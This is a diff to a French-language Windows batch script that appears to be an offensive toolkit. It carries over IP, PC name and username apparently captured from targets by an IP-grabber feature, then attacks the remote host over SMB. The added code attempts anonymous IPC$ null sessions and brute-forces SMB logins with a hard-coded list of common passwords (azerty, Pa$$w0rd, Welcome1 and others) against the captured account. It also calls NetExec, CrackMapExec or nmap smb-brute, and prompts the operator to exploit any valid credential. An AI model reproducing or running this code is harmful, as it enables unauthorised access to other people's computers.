@@ -1627,7 +1627,7 @@ if exist "%CAP_IPS%"  del /f /q "%CAP_IPS%"
 >>"%CAP_PS%" echo if ($entries.Count -eq 0) { exit 1 }
 >>"%CAP_PS%" echo $opts = ($entries ^| ForEach-Object { $_.IP + "~PC: " + $_.PC + " / User: " + $_.USR }) -join ";"
 >>"%CAP_PS%" echo $opts + ";[---];Saisir une IP ou DNS manuellement~IPv4, IPv6, DDNS, Tailscale;Retour" ^| Set-Content "%CAP_OPTS%" -Encoding ASCII
->>"%CAP_PS%" echo ($entries ^| ForEach-Object { $_.IP }) ^| Set-Content "%CAP_IPS%" -Encoding ASCII
+>>"%CAP_PS%" echo ($entries ^| ForEach-Object { $_.IP + ";" + $_.PC + ";" + $_.USR }) ^| Set-Content "%CAP_IPS%" -Encoding ASCII
 powershell -NoProfile -ExecutionPolicy Bypass -File "%CAP_PS%"
 set "cap_rc=%errorlevel%"
 if exist "%CAP_PS%" del /f /q "%CAP_PS%"
@@ -1642,13 +1642,16 @@ if "%cap_sel%"=="0" goto cyber_ip_grabber
 REM --- Retrouver l'IP par index (ligne N dans cap_ips) ---
 set "remote_ip="
 set "cnt=0"
-for /f "usebackq" %%L in ("%CAP_IPS%") do (
+for /f "usebackq tokens=1,2,3 delims=;" %%a in ("%CAP_IPS%") do (
     set /a cnt+=1
-    if "!cnt!"=="!cap_sel!" set "remote_ip=%%L"
+    if "!cnt!"=="!cap_sel!" (
+        set "remote_ip=%%a"
+        set "remote_pc=%%b"
+        set "remote_user=%%c"
+    )
 )
 if exist "%CAP_IPS%" del /f /q "%CAP_IPS%"
 if defined remote_ip (
-    set "remote_pc="
     set "remote_port=NONE"
     goto wan_public_scan
 )
@@ -1996,6 +1999,7 @@ if exist "%CAPFILE_EM%" (
     set /p cap_em=<"%CAPFILE_EM%"
     for /f "tokens=1 delims=;" %%a in ("!cap_em!") do set "remote_ip=%%a"
     for /f "tokens=2 delims=;" %%b in ("!cap_em!") do set "remote_pc=%%b"
+    for /f "tokens=3 delims=;" %%c in ("!cap_em!") do set "remote_user=%%c"
     del /f /q "%CAPFILE_EM%"
     if defined remote_ip (
         chcp 65001 >nul
@@ -2800,9 +2804,12 @@ echo.
 set "smb_host=!remote_ip!"
 set "tmp_v6=!remote_ip::=!"
 if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
+echo  [*] Nettoyage connexions existantes...
+net use "\\!smb_host!" /delete /y >nul 2>&1
+net use "\\!smb_host!\IPC$" /delete /y >nul 2>&1
 echo  [*] Tentative connexion \\!smb_host!\IPC$ sans credentials...
 set "SMB_OUT=%TEMP%\smb_null_out.txt"
-net use \\!smb_host!\IPC$ "" /user:"" > "%SMB_OUT%" 2>&1
+net use "\\!smb_host!\IPC$" "" /user:"" > "%SMB_OUT%" 2>&1
 set "smb_el=%errorlevel%"
 type "%SMB_OUT%"
 echo.
@@ -2815,6 +2822,8 @@ if "!smb_el!"=="0" (
     if exist "%SMB_OUT%" del /f /q "%SMB_OUT%"
     goto smb_null_end
 )
+findstr /C:"1219" "%SMB_OUT%" >nul 2>&1
+if not errorlevel 1 (echo  [-] Conflit de session - connexion existante detectee. Reconnectez-vous. & goto smb_null_done)
 findstr /C:"1937" "%SMB_OUT%" >nul 2>&1
 if not errorlevel 1 (echo  [-] NTLM desactive - authentification anonyme bloquee par GPO. & goto smb_null_done)
 findstr /C:"67" "%SMB_OUT%" >nul 2>&1
@@ -2938,27 +2947,88 @@ cls
 echo.
 echo %B%  [BRUTE] CREDENTIALS COMMUNS - SMB%N%
 echo  Cible : !remote_ip!
+if defined remote_pc   echo  PC    : !remote_pc!
+if defined remote_user echo  User  : !remote_user! %Y%[sera teste en priorite]%N%
 echo.
 set "smb_host=!remote_ip!"
 set "tmp_v6=!remote_ip::=!"
 if not "!tmp_v6!"=="!remote_ip!" set "smb_host=!remote_ip::=-!.ipv6-literal.net"
 set "b_u="
 set "b_p="
+net use "\\!smb_host!" /delete /y >nul 2>&1
+REM --- Detection outils externes ---
+set "tool_netexec="
+set "tool_cme="
+set "tool_nmap="
+where netexec >nul 2>&1 && set "tool_netexec=1"
+where crackmapexec >nul 2>&1 && set "tool_cme=1"
+where nmap >nul 2>&1 && set "tool_nmap=1"
+if defined tool_netexec (
+    echo  [i] NetExec detecte - utilisation pour le brute force SMB
+    echo.
+    call :brute_netexec
+    goto brute_tool_done
+)
+if defined tool_cme (
+    echo  [i] CrackMapExec detecte - utilisation pour le brute force SMB
+    echo.
+    call :brute_cme
+    goto brute_tool_done
+)
+if defined tool_nmap (
+    echo  [i] Nmap detecte - utilisation du script smb-brute
+    echo.
+    call :brute_nmap
+    goto brute_tool_done
+)
+echo  [i] Mode integre ^(net use^) - aucun outil externe detecte
+echo  [i] NetExec/CrackMapExec/Nmap ameliorent les performances si installes
+echo.
 echo  [*] Test sur \\!smb_host!\IPC$ ...
 echo.
-if not defined b_u call :brute_try "Administrator" ""
-if not defined b_u call :brute_try "Administrator" "admin"
-if not defined b_u call :brute_try "Administrator" "password"
-if not defined b_u call :brute_try "Administrator" "123456"
-if not defined b_u call :brute_try "Administrator" "admin123"
-if not defined b_u call :brute_try "Administrator" "Pa$$w0rd"
-if not defined b_u call :brute_try "admin" ""
-if not defined b_u call :brute_try "admin" "admin"
-if not defined b_u call :brute_try "admin" "password"
-if not defined b_u call :brute_try "admin" "1234"
-if not defined b_u call :brute_try "admin" "123456"
-if not defined b_u call :brute_try "guest" ""
-if not defined b_u call :brute_try "guest" "guest"
+if defined remote_user (
+    REM --- Username connu : on teste uniquement ce compte ---
+    echo  [i] Compte cible : %Y%!remote_user!%N%
+    echo.
+    if not defined b_u call :brute_try "!remote_user!" ""
+    if not defined b_u call :brute_try "!remote_user!" "!remote_user!"
+    if not defined b_u call :brute_try "!remote_user!" "password"
+    if not defined b_u call :brute_try "!remote_user!" "123456"
+    if not defined b_u call :brute_try "!remote_user!" "1234"
+    if not defined b_u call :brute_try "!remote_user!" "azerty"
+    if not defined b_u call :brute_try "!remote_user!" "azerty123"
+    if not defined b_u call :brute_try "!remote_user!" "Azerty123"
+    if not defined b_u call :brute_try "!remote_user!" "Azerty1234"
+    if not defined b_u call :brute_try "!remote_user!" "admin"
+    if not defined b_u call :brute_try "!remote_user!" "admin123"
+    if not defined b_u call :brute_try "!remote_user!" "Pa$$w0rd"
+    if not defined b_u call :brute_try "!remote_user!" "Welcome1"
+    if not defined b_u call :brute_try "!remote_user!" "qwerty"
+    if not defined b_u call :brute_try "!remote_user!" "qwerty123"
+    if not defined b_u call :brute_try "!remote_user!" "0000"
+    if not defined b_u call :brute_try "!remote_user!" "1111"
+    if not defined b_u call :brute_try "!remote_user!" "1234567890"
+) else (
+    REM --- Pas de compte connu : comptes generiques ---
+    echo  [i] Aucun compte capture - test comptes generiques
+    echo.
+    if not defined b_u call :brute_try "Administrator" ""
+    if not defined b_u call :brute_try "Administrator" "admin"
+    if not defined b_u call :brute_try "Administrator" "password"
+    if not defined b_u call :brute_try "Administrator" "123456"
+    if not defined b_u call :brute_try "Administrator" "admin123"
+    if not defined b_u call :brute_try "Administrator" "Pa$$w0rd"
+    if not defined b_u call :brute_try "Administrator" "Azerty123"
+    if not defined b_u call :brute_try "Administrator" "Welcome1"
+    if not defined b_u call :brute_try "admin" ""
+    if not defined b_u call :brute_try "admin" "admin"
+    if not defined b_u call :brute_try "admin" "password"
+    if not defined b_u call :brute_try "admin" "1234"
+    if not defined b_u call :brute_try "admin" "123456"
+    if not defined b_u call :brute_try "guest" ""
+    if not defined b_u call :brute_try "guest" "guest"
+)
+:brute_tool_done
 if defined b_u goto brute_found
 echo.
 echo  [-] Aucun credential commun accepte.
@@ -2995,13 +3065,39 @@ net use "\\!smb_host!\C$" /delete >nul 2>&1
 goto wan_post_scan
 
 :brute_try
+net use "\\!smb_host!" /delete /y >nul 2>&1
 echo  [-] %~1 / %~2
 net use "\\!smb_host!\IPC$" "%~2" /user:"%~1" >nul 2>&1
 if not errorlevel 1 (
-    net use "\\!smb_host!\IPC$" /delete >nul 2>&1
+    net use "\\!smb_host!\IPC$" /delete /y >nul 2>&1
     set "b_u=%~1"
     set "b_p=%~2"
 )
+goto :eof
+
+:brute_netexec
+echo  [*] NetExec SMB sur !remote_ip! ...
+echo  [i] Les lignes [+] indiquent un credential valide
+echo.
+netexec smb !remote_ip! -u Administrator admin user guest -p "" admin password 123456 admin123 Pa$$w0rd Welcome1 Azerty123
+echo.
+echo  [i] Si credential trouve : utilisez ^"J'ai le mot de passe^" pour l'exploiter.
+goto :eof
+
+:brute_cme
+echo  [*] CrackMapExec SMB sur !remote_ip! ...
+echo  [i] Les lignes [+] indiquent un credential valide
+echo.
+crackmapexec smb !remote_ip! -u Administrator admin user guest -p "" admin password 123456 admin123 Pa$$w0rd Welcome1 Azerty123
+echo.
+echo  [i] Si credential trouve : utilisez ^"J'ai le mot de passe^" pour l'exploiter.
+goto :eof
+
+:brute_nmap
+echo  [*] Nmap smb-brute sur !remote_ip!:445 ...
+nmap -p 445 --script smb-brute !remote_ip!
+echo.
+echo  [i] Si credential trouve : utilisez ^"J'ai le mot de passe^" pour l'exploiter.
 goto :eof
 
 :start_lan_scan
